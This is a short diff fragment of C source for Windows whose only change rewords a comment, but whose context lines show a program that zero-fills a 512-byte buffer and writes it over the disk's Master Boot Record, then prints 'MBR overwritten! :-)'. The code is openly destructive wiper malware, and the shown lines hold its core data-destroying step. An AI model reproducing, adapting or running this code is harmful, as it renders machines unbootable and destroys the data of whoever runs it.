@@ -29,7 +29,7 @@ int main()
         const char trash_data[BUFF_SIZE]; // string (array of char's) in which we will store our data (bytes) to overwrite MBR
         ZeroMemory(trash_data, BUFF_SIZE); //this function fills our variable - trash_data with 0 (512 zeros)
 
-        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our bytes worked (without errors) program will print
+        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our data worked (without errors) program will print
         {                                                                 //MBR overwritten and exit
             printf("MBR overwritten! :-)");
             Sleep(3000);
